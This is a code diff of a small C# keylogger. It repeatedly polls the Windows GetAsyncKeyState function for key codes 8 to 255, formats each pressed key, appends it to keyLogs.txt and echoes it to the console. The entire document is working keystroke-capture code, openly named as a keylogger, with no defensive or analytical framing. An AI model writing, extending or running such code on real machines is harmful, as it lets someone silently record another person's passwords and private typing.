@@ -9,23 +9,31 @@ namespace Keylogger
     {
         [DllImport("User32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
-        
+
         static void Main(string[] args)
         { 
             string filePath = Environment.CurrentDirectory + @"\keyLogs.txt";
-            File.CreateText(filePath);
+            string buff;
+            Console.WriteLine($"Key logs are saved in \"{filePath}\"");
             while (true)
             {
-                Thread.Sleep(10);
-                for (int i = 1; i <= 1279; i++)
+                Thread.Sleep(150);
+                for (int i = 8; i < 256; i++)
                 {
                     int keyState = GetAsyncKeyState(i);
                     if (keyState != 0)
                     {
-                        using (StreamWriter streamWriter = File.AppendText(filePath))
+                        if (((System.ConsoleKey)i).ToString().Length == 1)
                         {
-                            streamWriter.Write((System.ConsoleKey)i);
+                            buff = ((System.ConsoleKey)i).ToString();
                         }
+                        else 
+                        {
+                            buff = $"<{((System.ConsoleKey)i).ToString()}>";
+                        }
+
+                        File.AppendAllText(filePath, buff);
+                        Console.Write(buff);
                     }
                 }
             }
